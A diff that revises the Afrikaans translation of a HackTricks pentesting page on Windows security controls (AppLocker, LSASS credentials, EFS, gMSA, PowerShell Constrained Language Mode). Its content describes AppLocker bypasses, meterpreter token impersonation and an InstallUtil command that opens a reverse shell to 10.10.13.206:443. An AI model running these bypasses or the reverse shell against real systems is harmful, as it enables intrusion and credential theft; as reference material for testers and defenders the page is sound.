@@ -24,9 +24,9 @@ Kry Toegang Vandag:
 
 ## AppLocker Beleid
 
-'n Aansoek witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om teenwoordig te wees en op 'n stelsel te loop. Die doel is om die omgewing te beskerm teen skadelike malware en ongekeurde sagteware wat nie ooreenstem met die spesifieke besigheidsbehoeftes van 'n organisasie nie.
+'n Toepassing witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om teenwoordig te wees en op 'n stelsel te loop. Die doel is om die omgewing te beskerm teen skadelike malware en ongekeurde sagteware wat nie ooreenstem met die spesifieke besigheidsbehoeftes van 'n organisasie nie.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **aansoek witlys oplossing** en gee stelselsadministrateurs beheer oor **watter aansoeke en lêers gebruikers kan uitvoer**. Dit bied **fynbeheer** oor uitvoerbare lêers, skripte, Windows-installer lêers, DLL's, verpakte toepassings, en verpakte toepassingsinstalleerders.\
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **toepassing witlys oplossing** en gee stelselsadministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fyn beheer** oor uitvoerbare lêers, skripte, Windows-installer lêers, DLL's, verpakte toepassings, en verpakte toepassingsinstalleerders.\
 Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe** blokkeer en skrywe toegang tot sekere gidse, **maar dit kan alles omseil word**.
 
 ### Kontroleer
@@ -53,10 +53,10 @@ C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-* Gewoonlik **vertroude** [**"LOLBAS's"**](https://lolbas-project.github.io/) binêre kan ook nuttig wees om AppLocker te omseil.
+* Gewoonlik **vertroude** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
 * **Sleg geskryfde reëls kan ook omseil word**
-* Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, jy kan 'n **gids genaamd `allowed`** enige plek skep en dit sal toegelaat word.
-* Organisasies fokus ook dikwels op **die blokkering van die `%System32%\WindowsPowerShell\v1.0\powershell.exe` uitvoerbare**, maar vergeet van die **ander** [**PowerShell uitvoerbare plekke**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
+* Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, jy kan 'n **map genaamd `allowed`** enige plek skep en dit sal toegelaat word.
+* Organisasies fokus ook dikwels op **die blokkeer van die `%System32%\WindowsPowerShell\v1.0\powershell.exe` uitvoerbare lêer**, maar vergeet van die **ander** [**PowerShell uitvoerbare plekke**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
 * **DLL afdwinging baie selde geaktiveer** weens die ekstra las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat benodig word om te verseker dat niks sal breek nie. So, die gebruik van **DLL's as agterdeure sal help om AppLocker te omseil**.
 * Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell** kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
@@ -70,9 +70,9 @@ Plaaslike kredensiale is teenwoordig in hierdie lêer, die wagwoorde is gehasht.
 
 Die **kredensiale** (gehasht) word **gestoor** in die **geheue** van hierdie subsisteem vir Enkelteken-in redes.\
 **LSA** bestuur die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikersregte...), **verifikasie**, **toegangstokens**...\
-LSA sal die een wees wat die **kredensiale** in die **SAM** lêer (vir 'n plaaslike aanmelding) sal **kontroleer** en met die **domeinbeheerder** sal **praat** om 'n domein gebruiker te verifieer.
+LSA sal die een wees wat sal **kontroleer** vir verskafde kredensiale binne die **SAM** lêer (vir 'n plaaslike aanmelding) en **praat** met die **domeinbeheerder** om 'n domein gebruiker te verifieer.
 
-Die **kredensiale** word **gestoor** binne die **proses LSASS**: Kerberos kaartjies, hashes NT en LM, maklik ontsleutelde wagwoorde.
+Die **kredensiale** word **gestoor** binne die **proses LSASS**: Kerberos kaartjies, hashes NT en LM, maklik ontcijferbare wagwoorde.
 
 ### LSA geheime
 
@@ -123,12 +123,12 @@ sc query windefend
 ```
 ## Encrypted File System (EFS)
 
-EFS beveilig lêers deur middel van versleuteling, wat 'n **simmetriese sleutel** gebruik wat bekend staan as die **Lêer Versleuteling Sleutel (FEK)**. Hierdie sleutel word versleuteld met die gebruiker se **publieke sleutel** en gestoor binne die versleutelde lêer se $EFS **alternatiewe datastroom**. Wanneer ontsleuteling nodig is, word die ooreenstemmende **privaat sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te ontsleutel. Meer besonderhede kan gevind word [hier](https://en.wikipedia.org/wiki/Encrypting\_File\_System).
+EFS beveilig lêers deur middel van versleuteling, wat 'n **simmetriese sleutel** gebruik wat bekend staan as die **Lêer Versleuteling Sleutel (FEK)**. Hierdie sleutel word versleuteld met die gebruiker se **publieke sleutel** en gestoor binne die versleutelde lêer se $EFS **alternatiewe datastroom**. Wanneer ontsleuteling nodig is, word die ooreenstemmende **privaat sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te ontsleutel. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting\_File\_System) gevind word.
 
 **Ontsleuteling scenario's sonder gebruiker inisiatief** sluit in:
 
 * Wanneer lêers of vouers na 'n nie-EFS lêerstelsel, soos [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), verskuif word, word hulle outomaties ontsleutel.
-* Versleutelde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor oordrag ontsleutel.
+* Versleutelde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor transmissie ontsleutel.
 
 Hierdie versleutelingmetode stel **deursigtige toegang** tot versleutelde lêers vir die eienaar in staat. Dit is egter nie moontlik om die lêers te ontsleutel deur bloot die eienaar se wagwoord te verander en in te log nie.
 
@@ -136,7 +136,7 @@ Hierdie versleutelingmetode stel **deursigtige toegang** tot versleutelde lêers
 
 * EFS gebruik 'n simmetriese FEK, versleuteld met die gebruiker se publieke sleutel.
 * Ontsleuteling gebruik die gebruiker se privaat sleutel om toegang tot die FEK te verkry.
-* Outomatiese ontsleuteling vind plaas onder spesifieke toestande, soos kopieer na FAT32 of netwerk oordrag.
+* Outomatiese ontsleuteling vind plaas onder spesifieke toestande, soos om na FAT32 te kopieer of netwerk transmissie.
 * Versleutelde lêers is toeganklik vir die eienaar sonder addisionele stappe.
 
 ### Check EFS info
@@ -150,7 +150,7 @@ Jy kan ook `cipher /e` en `cipher /d` binne 'n vouer gebruik om **te versleutel*
 
 #### Being Authority System
 
-Hierdie metode vereis dat die **slagoffer gebruiker** 'n **proses** binne die gasheer **uitvoer**. As dit die geval is, kan jy met 'n `meterpreter` sessie die token van die gebruiker se proses naboots (`impersonate_token` van `incognito`). Of jy kan net `migrate` na die gebruiker se proses.
+Hierdie metode vereis dat die **slagoffer gebruiker** 'n **proses** binne die gasheer **uitvoer**. As dit die geval is, kan jy met 'n `meterpreter` sessie die token van die gebruiker se proses naboots (`impersonate_token` van `incognito`). Of jy kan eenvoudig `migrate` na die gebruiker se proses.
 
 #### Knowing the users password
 
@@ -158,12 +158,12 @@ Hierdie metode vereis dat die **slagoffer gebruiker** 'n **proses** binne die ga
 
 ## Group Managed Service Accounts (gMSA)
 
-Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "**Wagwoord verval nooit**" instelling geaktiveer het, bied gMSA's 'n veiliger en meer hanteerbare oplossing:
+Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekening in IT-infrastruktuur te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "**Wagwoord verval nooit**" instelling geaktiveer het, bied gMSA's 'n veiliger en meer hanteerbare oplossing:
 
-* **Outomatiese Wagwoordbestuur**: gMSA's gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein of rekenaarbeleid. Hierdie proses word hanteer deur Microsoft se Sleutelverspreidingsdiens (KDC), wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
+* **Outomatiese Wagwoordbestuur**: gMSA's gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein of rekenaarbeleid. Hierdie proses word deur Microsoft se Sleutelverspreidingsdiens (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
 * **Verbeterde Sekuriteit**: Hierdie rekeninge is immuun teen vergrendeling en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verbeter.
 * **Meervoudige Gasheerondersteuning**: gMSA's kan oor verskeie gasheers gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
-* **Geskeduleerde Taakvermoë**: Anders as bestuurde diensrekeninge, ondersteun gMSA's die uitvoering van geskeduleerde take.
+* **Geplande Taakvermoë**: Anders as bestuurde diensrekeninge, ondersteun gMSA's die uitvoering van geplande take.
 * **Vereenvoudigde SPN-bestuur**: Die stelsel werk outomaties die Diens Prinsipaal Naam (SPN) by wanneer daar veranderinge aan die rekenaar se sAMaccount besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.
 
 Die wagwoorde vir gMSA's word in die LDAP eienskap _**msDS-ManagedPassword**_ gestoor en word outomaties elke 30 dae deur Domein Beheerders (DC's) gereset. Hierdie wagwoord, 'n versleutelde datablad bekend as [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA's geïnstalleer is, verkry word, wat 'n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, is 'n beveiligde verbinding soos LDAPS nodig, of die verbinding moet geverifieer word met 'Sealing & Secure'.
@@ -207,7 +207,7 @@ In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [**PSByPassCLM**
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-#### Reverse shell:
+#### Terugskakel:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -241,7 +241,7 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 
 Is die API wat gebruik kan word om gebruikers te autentiseer.
 
-Die SSPI sal verantwoordelik wees vir die vind van die toepaslike protokol vir twee masjiene wat wil kommunikeer. Die verkieslike metode hiervoor is Kerberos. Dan sal die SSPI onderhandel oor watter autentifikasieprotokol gebruik sal word, hierdie autentifikasieprotokolle word Security Support Provider (SSP) genoem, is binne elke Windows-masjien in die vorm van 'n DLL geleë en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.
+Die SSPI sal verantwoordelik wees vir die vind van die toepaslike protokol vir twee masjiene wat wil kommunikeer. Die verkieslike metode hiervoor is Kerberos. Dan sal die SSPI onderhandel oor watter autentiseringsprotokol gebruik sal word, hierdie autentiseringsprotokolle word Security Support Provider (SSP) genoem, is binne elke Windows-masjien in die vorm van 'n DLL geleë en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.
 
 ### Main SSPs
 
@@ -269,24 +269,24 @@ Die SSPI sal verantwoordelik wees vir die vind van die toepaslike protokol vir t
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei te outomatiseer** wat deur die wêreld se **mees gevorderde** gemeenskapstools aangedryf word.\
+Kry Toegang Vandag:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ***
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Kyk na die [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) of die [**telegram group**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
